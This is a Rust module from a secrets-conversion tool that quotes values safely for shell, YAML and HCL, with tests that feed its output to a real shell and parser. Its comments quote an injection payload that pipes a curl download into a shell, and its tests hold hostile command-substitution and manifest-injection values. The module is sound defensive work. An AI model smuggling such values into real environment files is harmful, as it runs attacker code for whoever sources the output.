//! One quoting rule per output format, in one place.
//!
//! ⛔ **Every converter used to escape inline, and each got it differently
//! wrong.** The shell emitter escaped `"` and nothing else, so its output ran
//! code when sourced; the Kubernetes and Compose emitters escaped nothing, so
//! their output was not valid YAML; Terraform escaped `\` and `"` but not HCL's
//! interpolation markers.
//!
//! Measured against the shipped converter, with a `.env` holding
//! `CMD_SUB='$(touch /tmp/evnx-pwned)'`:
//!
//! ```text
//! $ evnx convert --to shell > out.sh
//! $ sh -n out.sh
//! out.sh: 13: Syntax error: Unterminated quoted string
//! $ . ./out.sh          # the file the tool told you to source
//! /tmp/evnx-pwned       ← created
//! $ echo "$DOLLAR"      # pa$sw0rd
//!                       ← empty; `$sw0rd` expanded
//! ```
//!
//! ⚠️ `cloud export --to shell` reaches the same code, and there the values come
//! from **other vault members** — so this is reachable by someone who is not the
//! person running the command.
//!
//! The rule for every function here: *whatever the value is, the consumer must
//! read back exactly that string.* Each one is tested by feeding its output to
//! the real consumer rather than by eyeballing the escape list.

/// A POSIX shell word that is exactly `value`.
///
/// Single quotes, because inside them **nothing** is special — no `$`, no
/// backtick, no backslash, no `#`. The only thing that needs handling is a
/// single quote itself, which is done by closing the quote, emitting an escaped
/// `'`, and reopening: `'\''`.
///
/// ⚠️ Double quotes are the trap. Inside them `$`, `` ` ``, `\` and `!` stay
/// live, so a correct double-quoted escaper needs four rules and gets no
/// warning when it misses one. The shipped emitter escaped `"` alone and
/// produced `export A="$(curl -s x.sh|sh)"`.
#[must_use]
pub fn shell_single(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            // close, escaped quote, reopen
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// A YAML scalar that reads back as exactly `value`, always a string.
///
/// Always double-quoted, deliberately. An unquoted YAML scalar is typed by its
/// shape, so the emitters were turning secrets into other things entirely:
///
/// ```text
/// PORT=8080      →  PORT: 8080     an integer; kubectl rejects the Secret
/// BOOL=true      →  BOOL: true     a boolean, same
/// COLON=key: val →  COLON: key: val   a mapping, or a parse error
/// HASH=a #b      →  HASH: a        truncated at the comment
/// ```
///
/// A double-quoted YAML scalar needs `\` and `"` escaped, and control
/// characters written as escapes — which also makes a value containing
/// `\n---\n` harmless, where unquoted it started a second document.
#[must_use]
pub fn yaml_scalar(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            // Everything else C0, written as YAML's \xNN.
            c if (c as u32) < 0x20 || c as u32 == 0x7f => {
                out.push_str(&format!("\\x{:02x}", c as u32));
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// An HCL string literal that reads back as exactly `value`.
///
/// ⚠️ `${` and `%{` are HCL's interpolation and directive markers. Escaping
/// only `\` and `"` left `DB_URL = "${var.secret}"` as a reference to a variable
/// that does not exist, so `terraform validate` failed on the generated tfvars
/// — or, worse, resolved to something else. They escape by doubling the first
/// character: `$${` and `%%{`.
#[must_use]
pub fn hcl_string(value: &str) -> String {
    let escaped = value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
        .replace("${", "$${")
        .replace("%{", "%%{");
    format!("\"{escaped}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The values that broke each emitter, kept in one list so every quoting
    /// function is tested against all of them rather than only its own.
    const HOSTILE: &[&str] = &[
        "$(touch /tmp/evnx-pwned)",
        "`touch /tmp/evnx-pwned`",
        "pa$sw0rd",
        "ends-with-backslash\\",
        "has # hash",
        "key: value",
        "8080",
        "true",
        "it's got a quote",
        "\"double\" and 'single'",
        "a\nb",
        "line\n---\ninjected: manifest",
        "${var.secret}",
        "%{ if true }",
        "",
        "  leading and trailing  ",
    ];

    /// ⛔ The decisive test: hand the output to a real shell and ask what it
    /// read back. `sh` is the consumer; an escape list is not.
    #[test]
    fn a_shell_word_reads_back_exactly() {
        for value in HOSTILE {
            let quoted = shell_single(value);
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("printf %s {quoted}"))
                .output()
                .expect("sh");
            assert!(
                out.status.success(),
                "sh could not parse {quoted}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            assert_eq!(
                String::from_utf8_lossy(&out.stdout),
                *value,
                "sh read back something else from {quoted}"
            );
        }
    }

    /// An `export` line must assign the value and run nothing.
    #[test]
    fn an_export_line_runs_no_code() {
        let probe = std::env::temp_dir().join(format!("evnx-quote-probe-{}", std::process::id()));
        let _ = std::fs::remove_file(&probe);
        let value = format!("$(touch {})", probe.display());
        let line = format!("export A={}", shell_single(&value));

        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("{line}; printf %s \"$A\""))
            .output()
            .expect("sh");

        assert!(!probe.exists(), "the export line executed the substitution");
        assert_eq!(String::from_utf8_lossy(&out.stdout), value);
        let _ = std::fs::remove_file(&probe);
    }

    /// A YAML scalar must come back as the same **string**, not as an integer,
    /// a boolean, a mapping, or a second document.
    #[test]
    fn a_yaml_scalar_reads_back_as_the_same_string() {
        // Build one mapping holding every hostile value and parse it whole, so
        // a value that starts a new document fails here rather than silently.
        let mut doc = String::from("---\n");
        for (i, v) in HOSTILE.iter().enumerate() {
            doc.push_str(&format!("  k{i}: {}\n", yaml_scalar(v)));
        }
        let parsed: serde_yaml::Value = serde_yaml::from_str(&doc)
            .unwrap_or_else(|e| panic!("emitted YAML does not parse: {e}\n{doc}"));
        let map = parsed.as_mapping().expect("a mapping");
        for (i, v) in HOSTILE.iter().enumerate() {
            let got = map
                .get(serde_yaml::Value::String(format!("k{i}")))
                .unwrap_or_else(|| panic!("k{i} missing"));
            assert_eq!(
                got.as_str(),
                Some(*v),
                "k{i} came back as {got:?} rather than the string {v:?}"
            );
        }
    }

    /// `${` and `%{` must not survive as interpolation.
    #[test]
    fn an_hcl_string_does_not_interpolate() {
        assert_eq!(hcl_string("${var.secret}"), r#""$${var.secret}""#);
        assert_eq!(hcl_string("%{ if x }"), r#""%%{ if x }""#);
        assert_eq!(hcl_string(r#"a"b\c"#), r#""a\"b\\c""#);
    }
}
